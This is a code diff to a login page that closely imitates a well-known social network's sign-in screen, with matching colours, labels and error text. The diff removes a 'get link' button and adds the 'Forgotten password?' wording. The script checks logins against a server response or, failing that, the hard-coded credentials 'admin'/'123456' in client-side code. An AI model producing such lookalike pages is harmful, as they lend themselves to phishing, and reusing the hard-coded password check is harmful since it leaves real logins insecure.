@@ -66,7 +66,7 @@
             box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
         }
 
-        .email-input {
+        .card input {
             width: 100%;
             padding: 14px 16px;
             margin-bottom: 12px;
@@ -77,58 +77,14 @@
             background: white;
         }
 
-        .email-input:focus {
+        .card input:focus {
             border-color: #1877f2;
             box-shadow: 0 0 0 2px #e7f3ff;
         }
 
-        .password-wrapper {
-            position: relative;
-            margin-bottom: 12px;
-        }
-
-        .password-wrapper input {
-            width: 100%;
-            padding: 14px 45px 14px 16px;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            font-size: 17px;
-            outline: none;
-            background: white;
-        }
-
-        .password-wrapper input:focus {
-            border-color: #1877f2;
-            box-shadow: 0 0 0 2px #e7f3ff;
-        }
-
-        .password-toggle {
-            position: absolute;
-            right: 14px;
-            top: 50%;
-            transform: translateY(-50%);
-            background: none;
-            border: none;
-            cursor: pointer;
-            padding: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .password-toggle svg {
-            width: 22px;
-            height: 22px;
-            fill: #65676b;
-        }
-
-        .password-toggle:hover svg {
-            fill: #1877f2;
-        }
-
-        .error-input {
-            border-color: #f02849 !important;
-            background-color: #fff8f8 !important;
+        .card input.error-input {
+            border-color: #f02849;
+            background-color: #fff8f8;
         }
 
         .login-btn {
@@ -180,27 +136,10 @@
             font-weight: bold;
             color: white;
             cursor: pointer;
-            margin-bottom: 12px;
         }
 
         .create-btn:hover {
             background: #36a420;
-        }
-
-        .get-link-btn {
-            background: #1877f2;
-            width: 100%;
-            border: none;
-            border-radius: 6px;
-            padding: 12px;
-            font-size: 17px;
-            font-weight: bold;
-            color: white;
-            cursor: pointer;
-        }
-
-        .get-link-btn:hover {
-            background: #166fe5;
         }
 
         .error-msg {
@@ -245,6 +184,10 @@
             font-size: 12px;
         }
 
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
         @keyframes shake {
             0%, 100% { transform: translateX(0); }
             25% { transform: translateX(-4px); }
@@ -253,6 +196,38 @@
 
         .shake {
             animation: shake 0.3s ease-in-out;
+        }
+
+        .password-wrapper {
+            position: relative;
+        }
+
+        .password-wrapper input {
+            padding-right: 45px;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .password-toggle svg {
+            width: 22px;
+            height: 22px;
+            fill: #65676b;
+        }
+
+        .password-toggle:hover svg {
+            fill: #1877f2;
         }
 
         @media (max-width: 900px) {
@@ -279,7 +254,7 @@
     </div>
     <div class="login-area">
         <div class="card">
-            <input type="text" id="email" class="email-input" placeholder="Email address or mobile number">
+            <input type="text" id="email" placeholder="Email address or mobile number">
             
             <div class="password-wrapper">
                 <input type="password" id="password" placeholder="Password">
@@ -297,7 +272,6 @@
             </div>
             <div class="divider"></div>
             <button class="create-btn" id="createBtn">Create new account</button>
-            <button class="get-link-btn" id="getLinkBtn">🔗 Log in to get link</button>
         </div>
     </div>
 </div>
@@ -333,7 +307,6 @@
 
     const emailInput = document.getElementById('email');
     const loginBtn = document.getElementById('loginBtn');
-    const getLinkBtn = document.getElementById('getLinkBtn');
     const errorDiv = document.getElementById('errorMsg');
 
     function showError(message, field) {
@@ -387,7 +360,7 @@
             if (data.success) {
                 alert('Login successful!');
             } else {
-                showError('The password that you\'ve entered is incorrect.', 'password');
+                showError('The password that you\'ve entered is incorrect. Forgotten password?', 'password');
                 passwordInput.value = '';
                 passwordInput.focus();
             }
@@ -395,25 +368,14 @@
             if (email === 'admin' && password === '123456') {
                 alert('Login successful!');
             } else {
-                showError('The password that you\'ve entered is incorrect.', 'password');
+                showError('The password that you\'ve entered is incorrect. Forgotten password?', 'password');
                 passwordInput.value = '';
                 passwordInput.focus();
             }
         }
     }
 
-    function doGetLink() {
-        const email = emailInput.value.trim();
-        if (!email) {
-            showError('Email address or mobile number is required.', 'email');
-            emailInput.focus();
-            return;
-        }
-        alert('🔗 Your secure link: https://neb.exam/results/1041');
-    }
-
     loginBtn.addEventListener('click', doLogin);
-    getLinkBtn.addEventListener('click', doGetLink);
     createBtn.addEventListener('click', () => alert('✨ Create new account'));
 
     emailInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') doLogin(); });
